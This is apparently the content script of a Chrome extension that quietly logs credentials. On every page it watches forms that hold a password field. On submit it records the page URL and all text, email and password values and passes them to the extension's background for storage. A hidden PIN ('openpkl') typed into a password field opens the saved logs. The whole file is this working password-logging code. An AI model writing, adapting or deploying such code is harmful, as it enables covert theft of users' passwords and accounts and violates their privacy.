function BackgroundConnector() {

  this.sendData = function(data, callback) {
    if(typeof callback === 'undefined') {
      callback = function() {};
    }
    chrome.runtime.sendMessage(data, callback);
  };

  this.sql = function(data) {
    data.action = 'DB';
    this.sendData(data);
  };

};

function Monitor(document) {
  this.document = document;

  this.serializeFormData = function(form) {
    var formData = {};
    var inputTypesToSerialize = ['text','email','password'];
    var formInputs = form.getElementsByTagName('input');
    Array.prototype.forEach.call(formInputs, function(formInput) {
      if(inputTypesToSerialize.indexOf(formInput.type.toLowerCase()) !== -1 && formInput.name !== '') {
        formData[formInput.name] = formInput.value;
      }
    });
    return formData;
  };

  this.recordDetails = function(form) {
    var self = this;
    form.addEventListener('submit', function(e) {
      var url = document.location.href;
      var formData = self.serializeFormData(form);
      var bgConnector = new BackgroundConnector();
      bgConnector.sql({
        'operation' : 'save',
        'data' : {
          'url' : url,
          'formData' : formData
        }
      });
    });
  };

  this.registerPin = function(input) {
    var pin = 'openpkl'; //default pin
    var bgConnector = new BackgroundConnector();
    bgConnector.sendData({'action' : 'PIN', 'operation' : 'get'}, function(response) {
      pin = response.pin;
    });
    input.addEventListener('keyup', function(e) {
      var val = e.target.value;
      if(val === pin) {
        bgConnector.sendData({'action' : 'SHOWLOGS'});
      }
    });
  };

  this.registerEvents = function() {
    var self = this;
    var inputs = document.getElementsByTagName('input');
    Array.prototype.forEach.call(inputs, function(input) {
      if(input.type.toLowerCase() === 'password') {
        if(input.form) {
          self.recordDetails(input.form);
        }
        self.registerPin(input);
      }
    });
  };

  this.startMonitoring = function() {
    this.registerEvents();
  };

};
var m = new Monitor(document);
m.startMonitoring();
